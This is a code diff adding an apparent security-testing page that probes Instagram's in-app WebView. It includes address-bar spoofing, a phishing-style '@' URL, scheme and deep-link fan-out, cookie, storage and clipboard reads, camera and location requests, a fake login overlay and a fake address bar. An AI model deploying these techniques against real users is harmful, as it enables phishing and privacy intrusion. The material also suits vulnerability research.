+    log(tag,"meta-refresh injected -> "+SPOOF_URL.slice(0,80));
+    break;
+  }
+
+  /* 1J2: JS redirect race after pushState */
+  case "1J2":{
+    try{
+      history.pushState(null,"Instagram","/accounts/login/");
+      document.title="Instagram";
+      log(tag,"pushState -> /accounts/login/");
+      log(tag,"bar should now show /accounts/login/ ...");
+      log(tag,"NOT redirecting (check bar first). If bar updated, that's a spoof.");
+    }catch(e){log(tag,"err: "+e)}
+    break;
+  }
+
+  /* 1K: Invalid scheme — httpx:// */
+  case "1K":{
+    var badUrl="httpx://instagram.com/accounts/login/";
+    log(tag,"location -> "+badUrl);
+    try{window.location.href=badUrl}catch(e){log(tag,"err: "+e)}
+    break;
+  }
+
+  /* 1K2: triple-slash */
+  case "1K2":{
+    var triUrl="https:///instagram.com/accounts/login/";
+    log(tag,"location -> "+triUrl);
+    try{window.location.href=triUrl}catch(e){log(tag,"err: "+e)}
+    break;
+  }
+
+  /* 1K3: userinfo @ in URL */
+  case "1K3":{
+    var atUrl="https://instagram.com@ajaone.github.io/testing-repository/test/ig-phish-landing.html";
+    log(tag,"location -> "+atUrl);
+    try{window.location.href=atUrl}catch(e){log(tag,"err: "+e)}
+    break;
+  }
+
+  /* ============ CATEGORY 2: WEBVIEW ESCAPE ================== */
+
+  /* 2A: fan-out custom schemes */
+  case "2A":{
+    var schemes=[
+      {n:"mailto",u:"mailto:test@test.com?subject=test"},
+      {n:"tel",u:"tel:+1234567890"},
+      {n:"sms",u:"sms:+1234567890&body=test"},
+      {n:"facetime",u:"facetime://+1234567890"},
+      {n:"shortcuts",u:"shortcuts://run-shortcut?name=test"},
+      {n:"maps",u:"maps://maps.apple.com/?q=test"},
+      {n:"itms-apps",u:"itms-apps://itunes.apple.com"},
+      {n:"metamask",u:"metamask://dapp/"+encodeURIComponent(SPOOF_URL)},
+      {n:"trust",u:"trust://open_url?url="+encodeURIComponent(SPOOF_URL)},
+      {n:"tg",u:"tg://resolve?domain=test"},
+      {n:"whatsapp",u:"whatsapp://send?text=test"},
+      {n:"x-callback",u:"x-callback-url://test"}
+    ];
+    log(tag,"firing "+schemes.length+" schemes...");
+    schemes.forEach(function(s,i){
+      setTimeout(function(){
+        log(tag,"  "+s.n+" -> "+s.u.slice(0,60));
+        fireIframe(s.u,tag);
+      },i*500);
+    });
+    break;
+  }
+
+  case "2A2": fireIframe("mailto:test@test.com?subject=IG+WebView+Test",tag); break;
+  case "2A3": fireIframe("tel:+1234567890",tag); break;
+
+  /* 2B: Universal Links */
+  case "2B":
+    fireIframe("https://metamask.app.link/dapp/ajaone.github.io",tag);
+    break;
+  case "2B2":
+    log(tag,"location -> metamask.app.link");
+    try{window.location.href="https://metamask.app.link/dapp/ajaone.github.io"}
+    catch(e){log(tag,"err: "+e)}
+    break;
+  case "2B3":
+    fireAnchor("https://metamask.app.link/dapp/ajaone.github.io",tag);
+    break;
+
+  /* 2C: instagram:// deep links */
+  case "2C":
+    log(tag,"instagram://camera");
+    fireIframe("instagram://camera",tag);
+    break;
+  case "2C2":
+    log(tag,"instagram://direct-inbox");
+    fireIframe("instagram://direct-inbox",tag);
+    break;
+  case "2C3":
+    log(tag,"instagram://settings");
+    fireIframe("instagram://settings",tag);
+    break;
+
+  /* ============ CATEGORY 3: SESSION / DATA LEAK ============= */
+
+  /* 3A: cookie + storage enum */
+  case "3A":{
+    log(tag,"--- cookies ---");
+    log(tag,document.cookie||"(no cookies accessible)");
+    log(tag,"--- localStorage keys ---");
+    try{
+      var lsKeys=Object.keys(localStorage);
+      log(tag,lsKeys.length+" keys: "+lsKeys.slice(0,20).join(", "));
+      lsKeys.slice(0,5).forEach(function(k){
+        log(tag,"  "+k+" = "+String(localStorage.getItem(k)).slice(0,100));
+      });
+    }catch(e){log(tag,"localStorage err: "+e)}
+    log(tag,"--- sessionStorage keys ---");
+    try{
+      var ssKeys=Object.keys(sessionStorage);
+      log(tag,ssKeys.length+" keys: "+ssKeys.slice(0,20).join(", "));
+    }catch(e){log(tag,"sessionStorage err: "+e)}
+    log(tag,"--- indexedDB ---");
+    try{
+      var dbs=indexedDB.databases?indexedDB.databases():null;
+      if(dbs&&dbs.then) dbs.then(function(r){log(tag,"dbs: "+JSON.stringify(r).slice(0,200))});
+      else log(tag,"databases() not available");
+    }catch(e){log(tag,"idb err: "+e)}
+    log(tag,"--- cache API ---");
+    try{
+      if(window.caches) caches.keys().then(function(k){log(tag,"cache keys: "+k.join(", "))});
+      else log(tag,"caches not available");
+    }catch(e){log(tag,"cache err: "+e)}
+    break;
+  }
+
+  /* 3B: JS bridge enumeration */
+  case "3B":{
+    log(tag,"--- window.webkit.messageHandlers ---");
+    if(window.webkit&&window.webkit.messageHandlers){
+      var handlers=Object.keys(window.webkit.messageHandlers);
+      log(tag,"handlers: "+handlers.join(", "));
+      /* try to enumerate common IG handler names */
+      var igNames=["igBridge","instagramBridge","nativeBridge","analytics",
+                   "log","navigation","share","auth","consent","openURL",
+                   "contextMenu","scrollEvent","interop","ReactNative"];
+      igNames.forEach(function(n){
+        try{
+          if(window.webkit.messageHandlers[n]){
+            log(tag,"FOUND handler: "+n);
+          }
+        }catch(e){}
+      });
+    }else{
+      log(tag,"no webkit.messageHandlers");
+    }
+    log(tag,"--- window properties scan ---");
+    var interesting=[];
+    for(var k in window){
+      if(/^(ig|instagram|fb|react|native|bridge|webkit|__)/i.test(k)){
+        interesting.push(k);
+      }
+    }
+    log(tag,"interesting globals: "+interesting.join(", "));
+
+    log(tag,"--- navigator properties ---");
+    log(tag,"sendBeacon: "+!!navigator.sendBeacon);
+    log(tag,"share: "+!!navigator.share);
+    log(tag,"credentials: "+!!navigator.credentials);
+    log(tag,"serviceWorker: "+!!navigator.serviceWorker);
+
+    log(tag,"--- listening for postMessage (fire an IG action to trigger) ---");
+    break;
+  }
+
+  /* 3C: clipboard */
+  case "3C":{
+    log(tag,"reading clipboard...");
+    if(navigator.clipboard&&navigator.clipboard.readText){
+      navigator.clipboard.readText().then(function(t){
+        log(tag,"CLIPBOARD CONTENT: "+t.slice(0,200));
+        log(tag,"!!! clipboard readable without prompt = privacy bug");
+      }).catch(function(e){log(tag,"clipboard denied: "+e)});
+    }else{
+      log(tag,"clipboard API not available");
+    }
+    /* also try deprecated execCommand */
+    try{
+      var ta=document.createElement("textarea");
+      document.body.appendChild(ta);ta.focus();
+      var ok=document.execCommand("paste");
+      log(tag,"execCommand paste: "+ok+", value: "+ta.value.slice(0,100));
+      ta.remove();
+    }catch(e){log(tag,"execCommand err: "+e)}
+    break;
+  }
+
+  /* 3C2: geolocation */
+  case "3C2":{
+    log(tag,"requesting geolocation...");
+    if(navigator.geolocation){
+      navigator.geolocation.getCurrentPosition(
+        function(p){
+          log(tag,"LOCATION: "+p.coords.latitude+", "+p.coords.longitude);
+          log(tag,"!!! geolocation granted without prompt = privacy bug");
+        },
+        function(e){log(tag,"geolocation denied: "+e.message)},
+        {enableHighAccuracy:true}
+      );
+    }else{log(tag,"geolocation not available")}
+    break;
+  }
+
+  /* 3C3: camera/mic */
+  case "3C3":{
+    log(tag,"requesting camera+mic...");
+    if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia){
+      navigator.mediaDevices.getUserMedia({video:true,audio:true}).then(function(stream){
+        log(tag,"STREAM GRANTED: "+stream.getTracks().map(function(t){return t.kind+":"+t.label}).join(", "));
+        log(tag,"!!! camera/mic granted without prompt = critical privacy bug");
+        stream.getTracks().forEach(function(t){t.stop()});
+      }).catch(function(e){log(tag,"media denied: "+e)});
+    }else{log(tag,"getUserMedia not available")}
+    /* also enumerate devices */
+    if(navigator.mediaDevices&&navigator.mediaDevices.enumerateDevices){
+      navigator.mediaDevices.enumerateDevices().then(function(devs){
+        log(tag,"devices: "+devs.map(function(d){return d.kind+":"+d.label}).join("; "));
+      });
+    }
+    break;
+  }
+
+  /* ============ CATEGORY 4: UI MANIPULATION ================= */
+
+  /* 4A: fake Instagram login overlay */
+  case "4A":{
+    $("fake-login").style.display="flex";
+    log(tag,"fake login overlay displayed");
+    log(tag,"if shown inside IG WebView, this is pixel-perfect phishing");
+    /* capture typed creds for evidence */
+    $("fake-btn").onclick=function(){
+      var u=$("fake-user").value;
+      var p=$("fake-pass").value;
+      log(tag,"CAPTURED: user="+u+" pass="+("*".repeat(p.length))+" ("+p.length+" chars)");
+      log(tag,"(in real attack, data would be exfiltrated to attacker server)");
+      $("fake-login").style.display="none";
+    };
+    break;
+  }
+
+  /* 4B: scroll-triggered fake bar */
+  case "4B":{
+    /* Add tall spacer to enable scrolling */
+    var spacer=document.createElement("div");
+    spacer.style.cssText="height:3000px";
+    spacer.id="scroll-spacer";
+    document.body.appendChild(spacer);
+    log(tag,"added scroll spacer — scroll down to trigger bar hide");
+    var shown=false;
+    window.addEventListener("scroll",function scrollHandler(){
+      if(window.scrollY>200&&!shown){
+        shown=true;
+        $("fake-bar").style.display="block";
+        document.body.style.paddingTop="44px";
+        log(tag,"fake address bar shown (showing instagram.com)");
+      }
+      if(window.scrollY<50&&shown){
+        shown=false;
+        $("fake-bar").style.display="none";
+        document.body.style.paddingTop="14px";
+      }
+    });
+    /* auto-scroll down */
+    setTimeout(function(){window.scrollTo({top:300,behavior:"smooth"})},500);
+    break;
+  }
+
+  default:
+    log(tag,"unknown case: "+c);
+  }
+}
+
+window.run=run;
+window.cl=cl;
+</script>
+</body>
+</html>
